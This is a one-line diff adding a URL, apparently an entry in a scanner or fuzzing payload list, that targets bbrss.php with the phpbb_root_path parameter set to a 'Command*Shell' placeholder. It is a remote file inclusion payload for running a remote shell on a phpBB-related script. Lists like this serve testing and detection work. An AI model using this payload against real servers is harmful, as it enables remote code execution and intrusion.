@@ -1,0 +1,1 @@
+http://www.example.com/path/bbrss.php?phpbb_root_path=Command*Shell
